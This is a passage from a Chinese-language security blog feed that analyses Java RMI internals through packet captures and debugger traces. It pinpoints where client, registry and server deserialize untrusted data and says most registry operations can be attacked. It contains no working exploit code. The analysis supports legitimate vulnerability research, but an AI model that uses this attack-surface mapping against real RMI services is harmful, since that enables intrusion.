class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新版本或适合您项目的版本 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 指定主类的全路径名称 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>org.rmi.RMIClient<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用maven打包即可</p><p>wireShark抓包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606155805887.png" alt="image-20240606155805887"></p><p>首先我们可以看见进行了TCP的三次握手, 建立了一条TCP链</p><p>其中192.168.1.11服务端, 192.168.244.128为客户端</p><p>这里我们也可以看见实际上是连接的1099端口(也就是Registry), 然后二者建立JRMP链接</p><p>随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”。我们看一下Registry的回复内容。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606160324349.png" alt="image-20240606160324349"></p><p>以下是ReturnData的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 97 34 1c 00 50 56 fb 95 99 08 00 45 00   ..).4..PV.....E.</span><br><span class="line">0010   01 5f ff 13 00 00 80 06 c3 a8 c0 a8 01 0b c0 a8   ._..............</span><br><span class="line">0020   f4 80 04 4b c3 b0 3e 74 47 95 a8 61 e0 04 50 18   ...K..&gt;tG..a..P.</span><br><span class="line">0030   fa f0 b2 f6 00 00 51 ac ed 00 05 77 0f 01 6e 7a   ......Q....w..nz</span><br><span class="line">0040   dd fb 00 00 01 8f ec 5e 33 e9 80 0e 73 7d 00 00   .......^3...s&#125;..</span><br><span class="line">0050   00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d   ....java.rmi.Rem</span><br><span class="line">0060   6f 74 65 00 0e 6f 72 67 2e 72 6d 69 2e 49 48 65   ote..org.rmi.IHe</span><br><span class="line">0070   6c 6c 6f 70 78 72 00 17 6a 61 76 61 2e 6c 61 6e   llopxr..java.lan</span><br><span class="line">0080   67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78 79 e1   g.reflect.Proxy.</span><br><span class="line">0090   27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68 74 00   &#x27;. ..C....L..ht.</span><br><span class="line">00a0   25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65 66 6c   %Ljava/lang/refl</span><br><span class="line">00b0   65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e 48 61   ect/InvocationHa</span><br><span class="line">00c0   6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a 61 76   ndler;pxpsr.-jav</span><br><span class="line">00d0   61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d   a.rmi.server.Rem</span><br><span class="line">00e0   6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63 61 74   oteObjectInvocat</span><br><span class="line">00f0   69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00 00 00   ionHandler......</span><br><span class="line">0100   00 02 02 00 00 70 78 72 00 1c 6a 61 76 61 2e 72   .....pxr..java.r</span><br><span class="line">0110   6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65   mi.server.Remote</span><br><span class="line">0120   4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e 03 00   Object.a...a3...</span><br><span class="line">0130   00 70 78 70 77 36 00 0a 55 6e 69 63 61 73 74 52   .pxpw6..UnicastR</span><br><span class="line">0140   65 66 00 0d 31 39 32 2e 31 36 38 2e 32 34 34 2e   ef..192.168.244.</span><br><span class="line">0150   31 00 00 f0 20 bb b8 2f e8 ae 23 c6 5f 6e 7a dd   1... ../..#._nz.</span><br><span class="line">0160   fb 00 00 01 8f ec 5e 33 e9 80 01 01 78            ......^3....x</span><br></pre></td></tr></table></figure><p>行0030 中<code>\xAC\xED</code>(ac ed)是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了.</p><p>行0150 中<code>\xF0 \x20</code>(f0 20)转换为十进制是61474, 这就是Server在本地开放的随机端口,这和之后与端口61474相对应</p><p>因此这条TCP链的作用就是Client根据传入的rmi地址链接远端服务器1099端口上的RMI Registry, 然后Registry向Client发送Server上的序列化数据，包括IP和开放的随机端口等。</p><p>再往下是第二个TCP链接, Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162034685.png" alt="image-20240606162034685"></p><p>之后是TCP四次挥手, 断开TCP连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162204581.png" alt="image-20240606162204581"></p><p>在此之中, Registry充当着类似网关的角色, 为Client返回远程对象的绑定信息, 然后Client的Stub连接位于Server上的Skeleton，最终远程方法还是在服务器上执行。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-81-1024x633.png" alt="图片-81-1024x633"></p><h2 id="RMI有关类介绍"><a href="#RMI有关类介绍" class="headerlink" title="RMI有关类介绍"></a>RMI有关类介绍</h2><h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p><code>LiveRef</code> 是 <code>java.rmi.server</code> 包中的一个类，负责管理远程对象的引用。它包括以下功能：</p><ol><li><strong>标识远程对象</strong>：每个远程对象在 JVM 中都有一个唯一的 <code>LiveRef</code> 实例，该实例用于唯一标识该远程对象。</li><li><strong>管理连接</strong>：维护客户端与远程对象之间的连接，确保远程对象的调用能够正确传递。</li><li><strong>引用计数</strong>：跟踪对远程对象的引用计数，以便在不再需要时正确地清理和回收资源。</li></ol><h4 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h4><p><code>UnicastRef</code> 负责处理远程方法调用的序列化和反序列化，将调用参数从客户端传输到服务器，并将结果从服务器返回给客户端。</p><p>它管理底层的网络连接和通信协议，确保远程方法调用能够正确地传递和处理。</p><p><code>UnicastRef</code> 包含一个 <code>LiveRef</code> 实例(封装)，<code>LiveRef</code> 保存了远程对象的引用信息，如对象标识符（<code>ObjID</code>）、远程对象所在的地址（<code>Endpoint</code>）、以及用于通信的底层通道。</p><h5 id="关键方法和属性"><a href="#关键方法和属性" class="headerlink" title="关键方法和属性"></a>关键方法和属性</h5><ul><li>**<code>newCall</code>**：创建一个新的远程调用。</li><li>**<code>invoke</code>**：执行远程调用。</li><li>**<code>done</code>**：完成远程调用并处理结果。</li></ul><h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p><code>UnicastServerRef</code> 是 Java RMI（Remote Method Invocation）框架中的一个类，用于管理<strong>单播</strong>远程对象的引用。在 Java RMI 中，远程对象需要被导出以便能够被远程调用，<code>UnicastServerRef</code> 类就是处理这些对象<strong>引用</strong>的主要类之一。</p><p>UnicastServerRef封装了LiveRef</p><blockquote><p>单播远程对象（Unicast Remote Object）是指在 RMI 中，一个特定的远程对象实例，只能在一个特定的地址（主机和端口）上被访问。与之相对的是多播对象（Multicast Object），后者可以通过多个路径访问。</p></blockquote><p><code>UnicastServerRef</code> 类是 <code>UnicastRef</code> 类的子类，继承了其一些基础功能，并添加了处理服务器端逻辑的功能。</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p><code>UnicastRemoteObject</code> 是一个便捷类，简化了创建远程对象的过程。它扩展了 <code>java.rmi.server.RemoteServer</code> 并实现了 <code>java.rmi.server.ServerRef</code> 接口</p><p><code>UnicastRemoteObject</code> 封装了 <code>UnicastServerRef</code> 的功能。</p><p>具体来说，当你创建一个 <code>UnicastRemoteObject</code> 时，它会在内部创建一个 <code>UnicastServerRef</code> 实例来处理实际的远程调用。</p><h4 id="RegistryImpl"><a href="#RegistryImpl" class="headerlink" title="RegistryImpl"></a>RegistryImpl</h4><p><code>RegistryImpl</code> 是 RMI 的一个内部实现类，它实现了<code>Registry</code>接口, 用于实现注册表服务。</p><p><code>RegistryImpl</code> 封装了<code>UnicastServerRef</code>, 使用 <code>UnicastServerRef</code> 来管理其自身的网络通信和远程对象引用。</p><h2 id="RMI流程源码分析"><a href="#RMI流程源码分析" class="headerlink" title="RMI流程源码分析"></a>RMI流程源码分析</h2><p>有了上面对于RMI流程的分析，下面我们根据源码来捋一捋信息是怎么在Server、Client与Registry中流动的。</p><p>其总体的一个调用方式是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1592803976000-5xjsli.png" alt="1592803976000-5xjsli"></p><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br></pre></td></tr></table></figure><h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>这里还是比较复杂, 我自己梳理了一下把关键步骤画了一个流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/rmi_server.jpg"></p><p>断点打在 RMIServer 的创建远程对象这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606170622577.png" alt="image-20240606170622577"></p><p>首先我们要分析的是一个远程对象是如何被发布到网络上去的</p><p><strong><code>RMIHello</code></strong> 这个类是继承于 <code>UnicastRemoteObject</code> 的，我们使用了父类的构造器来创建它。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606171457782.png" alt="image-20240606171457782"></p><p>这里exportObject表示导出(发布)这个对象自身(this)到0端口(后面会看见这其实表示随机端口),</p><p>F7跟进exportObject()</p><p><code>exportObject()</code> 是一个静态函数，它就是主要负责<strong>将远程服务发布到网络上</strong></p><p>第一个参数是 obj 对象，第二个参数是 <code>new UnicastServerRef(port)</code>，第二个参数是用来处理网络请求的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172149233.png" alt="image-20240606172149233"></p><p>这里实际上是一个动态代理中典型的封装操作, obj本身是一个要被发布出去的对象, 这个对象只在乎其包含了哪些功能, 对于如何发布它, 它如何与客户端进行网络请求并不关心, 因此这里的<code>UnicastServerRef</code>就是利用动态代理的方式来增强这个对象, 完成网络请求的功能</p><p>继续跟进<code>UnicastServerRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172355596.png" alt="image-20240606172355596"></p><p>它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172501903.png" alt="image-20240606172501903"></p><p>跟进去之后，先是一个构造函数，先跳进 this 看一看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172556199.png" alt="image-20240606172556199"></p><p>第一个参数 ID，第三个参数为 true，所以我们重点关注一下第二个参数。</p><blockquote><p>TCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172722549.png" alt="image-20240606172722549"></p><p>F8跳过这个方法, 继续F7进到 LiveRef 的构造函数 this 里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172942389.png" alt="image-20240606172942389"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606173251407.png" alt="image-20240606173251407"></p><p>此时发现 host 和 port 是赋值到了 endpoint 里面，而 endpoint 又是被封装在 LiveRef 里面的，</p><p>所以这些网络请求相关的数据是在 LiveRef 里面，并且这一 LiveRef 至始至终只会存在一个。</p><p>上述是 LiveRef 创建的过程，然后我们一路F8再回到之前出现 <code>LiveRef(port)</code> 的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174046968.png" alt="image-20240606174046968"></p><p>刚刚看完了new LiveRef() 的过程, 接下来F7到super中看一看它的父类 <code>UnicastRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174412573.png" alt="image-20240606174412573"></p><p>这里<code>UnicastServerRef</code> 是继承了<code>UnicastRef</code>,</p><p>此时<code>ref</code>这个属性就是对其在网络上的一个描述, 包括了其所开放在的ip与端口位置</p><p>一路 f7 回到exportObject()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174558218.png" alt="image-20240606174558218"></p><p>此前我们分析的是new UnicastServerRef(port)的过程, 继续F7</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174637562.png" alt="image-20240606174637562"></p><p>刚刚的sref(也就是对远程对象在网络上位置的描述)被赋值给了远程对象obj的ref属性</p><p>继续往后看, 进去下面那个<code>sref.exportObject()</code> 注意此时调用的是sref(也就是程序中新创建的)的方法, 并不是远程对象的属性ref</p><p>直到此处出现 Stub</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175005366.png" alt="image-20240606175005366"></p><p>Stub明明是Client中的存根, 为什么会出现在Server中呢?</p><blockquote><ul><li>RMI 先在 Service 的地方，也就是服务端创建一个 Stub，再把 Stub 传到 RMI Registry 中，最后让 RMI Client 去获取 Stub。</li></ul></blockquote><p>接着我们研究 Stub 产生的这一步，</p><p>先F8到197行, 再F7进到 <code>createProxy</code> 这个方法里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175626515.png" alt="image-20240606175626515"></p><p>注意: 这里的第二个参数<code>clientRef</code> 由<code>getClientRef()</code>产生, 通过观察变量值, 他与服务器上远程对象的ref属性是同一个</p><p>我们往下看, 这里并不会进去if里面, 先不看这个if</p><p> 可以看见下面有一个很明显的动态代理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175615840.png" alt="image-20240606175615840"></p><p>第一个参数是 <code>AppClassLoader</code>，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个 ref，它也是和之前我们看到的 ref 是同一个</p><p>创建远程服务当中永远只有一个 ref。</p><p>继续F8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205627290.png" alt="image-20240606205627290"></p><p>到这里就把动态代理创建好了，如图创建好了一个Stub等待客户端来获取(这个Stub并不包含远程对象本身)</p><p>继续 f8，到 Target 这里，Target 这里相当于一个总的封装，将所有用的东西放到 Target 里面，我们可以进去看一看 Target 里面都放了什么。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205812091.png" alt="image-20240606205812091"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205839158.png" alt="image-20240606205839158"></p><p>并且这里的几个 ref 都是同一个，通过 ID 就可以查看到它们是同一个。比如比较 disp 和 stub 的。一个是服务端 ，一个是客户端的，ID 是一样的，</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222744415.png" alt="image-20240606222744415"></p><p>一路 f8，回到之前的 Target，下一条语句是 <code>ref.exportObject(target)</code>，把 target 这个封装好了的对象发布出去。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222922598.png" alt="image-20240606222922598"></p><p>我们一路F7跟进, 直到这里的listen进行网络请求</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223026872.png" alt="image-20240606223026872"></p><p>继续F7跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223314933.png" alt="image-20240606223314933"></p><p>这里获取了<code>TCPEndpoint</code></p><p>我们F8进入到<code>server = ep.newServerSocket();</code>这里跟进</p><p>它创建了一个新的 socket，已经准备好了，等别人来连接</p><p>并且这个 <code>newServerSocket()</code> 方法会给 port 进行赋值, 若port被设置为0则随机赋一个值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223854543.png" alt="image-20240606223854543"></p><p>然后回到 listen 去，一路 f8，观察一下整个流程结束之后 Target 里面是增加了 port。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224204732.png" alt="image-20240606224204732"></p><h4 id="发布完成之后的记录"><a href="#发布完成之后的记录" class="headerlink" title="发布完成之后的记录"></a>发布完成之后的记录</h4><p>我们F7进去<code>super.exportObject(target);</code>这里, 也就是上一张图片的260行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224724277.png" alt="image-20240606224724277"></p><p>我们F7跟进<code>ObjectTable.putTarget(target);</code></p><p>进去后一路F8 </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225107839.png" alt="image-20240606225107839"></p><p>直到此处, RMI 这里会把所有的信息保存到<strong>两个 table</strong>里面</p><p>类似于日志, 这些记录是保存到静态的 HashMap 当中。</p><h3 id="创建注册中心-绑定"><a href="#创建注册中心-绑定" class="headerlink" title="创建注册中心 + 绑定"></a>创建注册中心 + 绑定</h3><p>我们使用<code>registry.bind</code>来注册, 断电打在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225831522.png" alt="image-20240606225831522"></p><p>可以看见<code>createRegistry</code>方法返回<code>RegistryImpl</code>对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606165122844.png" alt="image-20240606165122844"></p><p>F7进去, 有一大堆的安全验证不太重要直接F8过了</p><p>直到<code>RegistryImpl</code>, 我们F7进去</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231221520.png" alt="image-20240606231221520"></h3><p>这里有一步判断 port 是否为注册中心的 port</p><p>再往下走，它创建了一个 <code>LiveRef</code>，以及创建了一个新的 <code>UnicastServerRef</code>，这段代码就和我们上面讲的创建远程对象是很类似的，我们可以跟进 <code>setup</code> 看一下</p><p>跟进之后发现和之前是一样的，也是先赋值，然后进行 <code>exportObject()</code> 方法的调用。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231642087.png" alt="image-20240606231642087"></p><p>我们还是F7进入<code>exportObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607184256288.png" alt="image-20240607184256288"></p><p>到了创建 Stub 的阶段。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185404298.png" alt="image-20240607185404298"></p><p>这里与发布对象时有所不同, 这里会进到<code>createStub</code>这个函数中, 发布对象时不进入这个if, 往后直接创建了动态代理</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185801158.png" alt="image-20240607185801158"></p><p>这里使用<code>forname</code>反射创建</p><p>一路F8, 回到<code>createProxy</code>的地方, 下面就是<code>setSkeleton</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607190052291.png" alt="image-20240607190052291"></p><p>顾名思义就是创建<code>Skeleton</code>骨架</p><p>再往后就是创建<code>Target</code>与之前相同 F8跳过</p><p>直到一步<code>super.exportObject()</code>进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607212901501.png" alt="image-20240607212901501"></p><p>这里也和之前类似, 把封装的 target put到一个table里, 我们可以跟进去putTarget看一下, 去之前的操作是类似的</p><p>我们F8把这些流程走完, 之后就是保存了一些数据</p><p>我们再来看绑定是如何实现的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115147520.png" alt="image-20240608115147520"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115313738.png" alt="image-20240608115313738"></p><p>这里首先检查bindings这个hashTable是否为空, 若空则把远程对象的引用放进去(ip 端口)</p><p>比较简单的一个过程</p><p>这里我也画了一个大致的流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/RMI_Registry_2.jpg" alt="RMI_Registry_2"></p><h3 id="客户端调用注册中心"><a href="#客户端调用注册中心" class="headerlink" title="客户端调用注册中心"></a>客户端调用注册中心</h3><p>前面都是很安全的操作, 到这一步, 如之前抓包所说, 存在反序列化的操作, 因此这里是受威胁的</p><h4 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h4><p>这个过程去创建注册中心是高度相似的, 就不做展示了</p><p>我们快速过完后就会发现这里已经获取到注册中心的stub了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609152349355.png" alt="image-20240609152349355"></p><h4 id="lookup查找远程对象"><a href="#lookup查找远程对象" class="headerlink" title="lookup查找远程对象"></a>lookup查找远程对象</h4><p>很可惜这里有一部分是.class文件,没法调试, 在lookup处打断点会跳转到别的地方</p><p>不过问题不大, 我们先F8找到lookup处</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609153619883.png" alt="image-20240609153619883"></p><p>注意这里的<code>var3.writeObject(var1);</code>var1是lookup的参数, 也就是<code>hello</code>这里被反序列化后传了进去, 在这之后registry会反序列化读取, 这就造成了威胁</p><p>后面就是<code>super.ref.invoke(var2);</code>这里<code>super.ref</code>就是<code>UnicastRef</code>这个类, 我们直接去这个类下的invoke打断点</p><p>之后就可以跳转到这个方法中, 这里是可以调试的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609160036017.png" alt="image-20240609160036017"></p><p>这里的 <code>invoke()</code> 方法是类似于激活的方法</p><p><code>invoke</code>里会调用<code>call.executeCall();</code>它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161551640.png" alt="image-20240609161551640"></p><p>这里往下会有一处<code>ReadObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161525554.png" alt="image-20240609161525554"></p><p><code>in</code>是在这里创建的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161732711.png" alt="image-20240609161732711"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161757770.png" alt="image-20240609161757770"></p><p>不难理解，in 就是数据流里面的东西。</p><blockquote><p>这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了 ———— 如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。这里的漏洞相比于其他漏洞更为隐蔽。</p><ul><li>也就是说，只要调用 <code>invoke()</code>，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。</li></ul></blockquote><p>之后走完这个过程, 结束后我们就会获取到远程对象的动态代理, 其中包含了它的ref, 明确其开放的端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162034596.png" alt="image-20240609162034596"></p><h4 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h4><p>对应了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ihello.sayHello(<span class="string">&quot;hello, n4c1!&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于ihello是一个动态代理, 因此我们会跳到它的handler的invoke方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162755645.png" alt="image-20240609162755645"></p><p>这些if都不太重要, 主要是后面的</p><p>return invokeRemoteMethod(proxy, method, args);</p><p>这里看名字就知道是执行远程类的方法跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164451084.png" alt="image-20240609164451084"></p><p>到这里的<code>ref.invoke</code>继续跟进</p><p>我们往下走到这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164746609.png" alt="image-20240609164746609"></p><p>跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165026740.png" alt="image-20240609165026740"></p><p>这里会将我们传给调用方法的参数序列化写进out里</p><p>之后再往下走就又到了<code>call.executeCall()</code>,即每进行一次网络请求都会调用<code>call.executeCall()</code>这个方法, 当然这里面是易受攻击的</p><p>我们继续往下, 就到了<code>unmarshalValue</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165448317.png" alt="image-20240609165448317"></p><p>这个方法与<code>marshalValue</code>类似, 但这个是<code>readObject</code>反序列化把connection中的数据读回来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165903310.png" alt="image-20240609165903310"></p><p>因此这里也是易受攻击的</p><p>到这里这一块基本上就结束了</p><h3 id="客户端发起请求，注册中心如何处理"><a href="#客户端发起请求，注册中心如何处理" class="headerlink" title="客户端发起请求，注册中心如何处理"></a>客户端发起请求，注册中心如何处理</h3><p>断点打在下面这个位置,  找不到的话打开rt.jar(java核心类)</p><p>在sun.rmi.Transport.Transport.java中的<code>serviceCall</code>方法中.  </p><p>先debug服务端, 再运行客户端就可以断在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609183403670.png" alt="image-20240609183403670"></p><p>F8过这条, 我们看Target中, 有一个Stub, 里面有一个ref对应着1099端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200115650.png" alt="image-20240609200115650"></p><p>再往下看<code>final Dispatcher disp = target.getDispatcher();</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200944126.png" alt="image-20240609200944126"></p><p>这里是将 Target.disp(对应着<code>skel</code>) 的值放到 disp 里面。</p><p>继续往下走, 有一个<code>disp.dispatch(impl, call);</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609201951099.png" alt="image-20240609201951099"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202110937.png" alt="image-20240609202110937"></p><p>继续跟进这个<code>oldDispatch</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202255595.png" alt="image-20240609202255595"></p><p>注意这里又没法调试了, 代码会乱跳</p><p>我们需要把断点打在<code>sun.rmi.registry</code>包下的<code>RegistryImpl_Skel</code>类的<code>dispatch</code>方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202852918.png" alt="image-20240609202852918"></p><p>这段代码是用来判断客户端向registry发起的请求方式的</p><p>有以下几种,以及其对应的编号</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要对印的case中有反序列化就是易受攻击的</p><p>例如</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609203336416.png" alt="image-20240609203336416"></p><p>实际上除了list都是可以攻击的</p><p>并且是客户端向registry发起攻击</p><h3 id="客户端发起请求，服务端如何处理"><a href="#客户端发起请求，服务端如何处理" class="headerlink" title="客户端发起请求，服务端如何处理"></a>客户端发起请求，服务端如何处理</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-RMI&quot;&gt;&lt;a href=&quot;#Java-RMI&quot; class=&quot;headerlink&quot; title=&quot;Java RMI&quot;&gt;&lt;/a&gt;Java RMI&lt;/h1&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuoj一次刷个够</title>
    <link href="http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/"/>
    <id>http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/</id>
    <published>2024-05-30T05:51:33.000Z</published>
    <updated>2024-06-04T07:54:33.284Z</updated>
    
